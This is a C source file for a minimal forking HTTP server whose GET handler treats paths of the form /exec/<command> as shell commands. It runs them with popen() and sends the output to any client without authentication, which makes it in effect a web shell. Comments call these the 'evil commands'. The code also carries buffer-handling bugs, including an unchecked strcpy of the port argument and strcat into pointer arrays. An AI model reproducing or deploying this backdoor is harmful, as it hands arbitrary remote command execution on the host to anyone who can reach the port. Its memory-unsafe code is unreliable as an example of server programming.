#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<unistd.h>
#include<netdb.h>
#include<signal.h>
#include<fcntl.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<sys/socket.h>
#include<arpa/inet.h>

#define MAX_CHARS 99999


#define CLIENTS_MAX 1000
#define BYTES 1024

#define HTTP_RESPONSE_200 "HTTP/1.1 200 OK\n\n"
#define HTTP_RESPONSE_404 "HTTP/1.1 404 Not Found\n"
#define HTTP_RESPONSE_400 "HTTP/1.1 400 Bad Request\n"



char *web_server_root_path;
int listening_socket;
int clients[CLIENTS_MAX];


void web_server_start(char *);
void web_server_respond(int);


int main(int argc , char* argv[ ] )
{
	// Quiting if no port number was given.
	if (argc != 2) {
                printf("Usage: %s <port> \n", argv[0]);
                exit(1);
        }


	//struct sockaddr_in {
        //       sa_family_t    sin_family; /* address family: AF_INET */
        //       in_port_t      sin_port;   /* port in network byte order */
        //       struct in_addr sin_addr;   /* internet address */
        //   };
    	struct sockaddr_in client_address;

	// going to take the client address size later.
    	socklen_t address_length; 

    	char c;    
    	
	// going to hold the listening port.
    	char listening_port[6]; // MAX PORT 65535
	
	// setting the default root directory for the web server
	// the current directory.
    	web_server_root_path = getenv("PWD");
    	
	
	// listening port will take the command line argument value.
	strcpy(listening_port,argv[1]);

    	int slot=0;
	
	
  	printf("Listening on port %s \nRoot directory is %s\n\n\n",listening_port, web_server_root_path); 
    	
	// setting up the values of the clients to -1 which means
	// that the client is not connected.
    	int i;
    	for (i=0 ; i < CLIENTS_MAX; i++ )
        	clients[i]=-1;


	// let's start the server now.
    	web_server_start(listening_port);


    	// we are going to start accepting connections here.
    	while (1)
    	{
        	address_length = sizeof(client_address);
	
		clients[slot] = accept(listening_socket, (struct sockaddr *) &client_address, &address_length);


		// If there is an error. 
        	if ( clients[slot] < 0 ) {
			perror ("Error: accept().");
		} else {
			// fork(): creating a new child process.
			if ( fork() == 0 ) {
				web_server_respond(slot);
				exit(0);
			}
            	}

        	while (clients[slot] != -1) 
			slot = (slot + 1) % CLIENTS_MAX;
    	}

    	return 0;
}



void web_server_start(char *port) {
   	
	struct addrinfo hints, *res, *p;

    	
    	memset (&hints, 0, sizeof(hints));
    	hints.ai_family = AF_INET;
    	hints.ai_socktype = SOCK_STREAM;
    	hints.ai_flags = AI_PASSIVE;
    


	//int getaddrinfo(const char *node, const char *service,
        //               const struct addrinfo *hints,
        //               struct addrinfo **res);
	if (getaddrinfo( NULL, port, &hints, &res) != 0) {
        	perror ("Error: getaddrinfo()"); 
		exit(1);
	}


    	
    	for (p = res ; p != NULL ; p = p->ai_next)
    	{
		// int socket(int domain, int type, int protocol); 
        	listening_socket = socket ( p->ai_family , p->ai_socktype , 0 );
        	if ( listening_socket == -1) { 
			continue;
		}
		
		//int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
		// if success
        	if ( bind ( listening_socket , p->ai_addr , p->ai_addrlen ) == 0) {
			 break;
		}
    	}


    	if ( p == NULL) {
        	perror ("Error: socket() or bind().");
        	exit(1);
    	}

	// void freeaddrinfo(struct addrinfo *res);
    	// this is going to free the memory that was allocated for 
        // for the allocated linked list res.
	freeaddrinfo(res);

    	// int listen(int sockfd, int backlog);
	// this is going to accept incoming connections requests using accept().
    	if ( listen ( listening_socket , 1000000 ) != 0 ) {
        	perror("Error: listen().");
        	exit(1);
    	}
}

void web_server_respond(int n) {

	char *client_request[MAX_CHARS];
	
	// this is going to be for our evil commands.
    	char *evil_cmd[2];

    	char message[MAX_CHARS];


	char data_to_send[BYTES];
	char path[MAX_CHARS];
	
    	int received;
	int  fd;
	int  bytes_read;


  	memset( (void*) message, (int)'\0' , MAX_CHARS );

        //ssize_t recv(int sockfd, void *buf, size_t len, int flags);
        // with flags = 0 recv will be similar to read().	
	received = recv( clients[n] , message , MAX_CHARS , 0 );

	// If no messages are available to be received and the peer has performed an orderly
        // shutdown, recv() is going to return 0.
	if ( received == 0 ) {   
        	fprintf( stderr, "Error: Client Disconnected.\n" );
    	}

    	else if ( received < 0 ) {
        	fprintf(stderr,("Error: recv()\n"));
 	} 	
	

	// we have receeived something. 
	else {
        	printf("\nRequest: %s", message);

		// seperating the client request.
		// [0] will get the request type: GET, POST, HEAD.
		// char *strtok(char *str, const char *delim).
        	client_request[0] = strtok (message, " \t\n");

		// Handling GET requests.
        	if ( strncmp(client_request[0] , "GET\0" , 4 ) == 0 )
		{
            		// [1] will get file path. /exec/<command>. Muahahaha.
			//client_request[1] = strtok (NULL, " ");

			// [2] will get the protocol version. HTTP/1.1 or HTTP/1.0.
            		//client_request[2] = strtok (NULL, " \t\n");
			int ii;
			int i;
			char *hishcmd[MAX_CHARS];
			char *http_version[MAX_CHARS];
			
			for (ii = 1; ii < MAX_CHARS;ii++)
			{
				client_request[ii] = strtok (NULL, " ");
				if (strncmp(client_request[ii],"HTTP/1.1", 8) == 0) {
					strcpy(http_version, "HTTP/1.1");
					break;
				} else if (strncmp(client_request[ii],"HTTP/1.0", 8) == 0) {
					strcpy(http_version, "HTTP/1.0");
					break;
				}

				hishcmd[ii-1] = client_request[ii];
				
			}

			printf("Request HTTP Version : %s \n", http_version);
			
			char *final_cmd[MAX_CHARS];// = strcat(hishcmd[]);
				
			for (i=0; i < ii-1; i++)
			{
				
				printf("[%d] %s\n", i, hishcmd[i]);
			}
			
			for (i =0; i < ii-1;i++) {
				strcat(final_cmd, hishcmd[i]);
				strcat(final_cmd, " ");
			}
			printf("%s\n ", final_cmd);
			

			char *final_final_cmd[MAX_CHARS];
			final_final_cmd[0] = strtok(final_cmd, "/");
			final_final_cmd[1] = strtok(NULL, "/");
			printf("%s\n", final_final_cmd[1]);
			//printf("%s", client_request[ii]);
            		if ( strncmp( http_version , "HTTP/1.0" , 8 ) != 0 
				&& strncmp( http_version , "HTTP/1.1", 8) != 0 )
			{
				// sending the client
                		write(clients[n], HTTP_RESPONSE_400 ,strlen(HTTP_RESPONSE_400));
            		} else {
               			if ( strncmp(client_request[1], "/\0", 2) == 0 ) {
                    			client_request[1] = "/index.html";
				}

                		strcpy(path, web_server_root_path);
				
				if (strncmp(final_final_cmd[0], "exec", 4) == 0) {
					printf("execute command: ");

					evil_cmd[0] = strtok(client_request[1], "/");
					evil_cmd[1] = strtok(NULL, "/"); 
			
					printf("%s\n", final_final_cmd[1]);
					send(clients[n], HTTP_RESPONSE_200, strlen(HTTP_RESPONSE_200), 0);
					FILE *fp;
					fp = popen(final_final_cmd[1],"r");
					char content[10000];
					while (fgets(content, 10000, fp) != NULL)
						write(clients[n], content, 10000);
				}
		
                		else {
					write(clients[n], HTTP_RESPONSE_404, strlen(HTTP_RESPONSE_404));
				}
            		}
        	}
		// Handling other HTTP requests types
		else 
		{
			write(clients[n] , HTTP_RESPONSE_404 , strlen(HTTP_RESPONSE_404) );
		}	
    	}

    	shutdown (clients[n], SHUT_RDWR);    
    	close(clients[n]);
    	clients[n]=-1;
}


